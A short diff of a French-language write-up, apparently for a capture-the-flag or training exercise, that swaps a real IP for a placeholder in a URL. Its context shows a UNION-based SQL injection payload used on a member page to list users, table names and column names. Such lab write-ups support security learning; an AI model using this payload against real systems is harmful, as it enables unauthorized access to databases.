@@ -8,7 +8,7 @@
 ## Découverte
 
 
-Sur la page http://10.11.200.198/?page=member on injecte cette ligne de sql \
+Sur la page http://{IP_ADDRESS}/?page=member on injecte cette ligne de sql \
 pour connaitre tous les users ainsi que le nom des tables et des colonnes:
 ```
 1 or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns
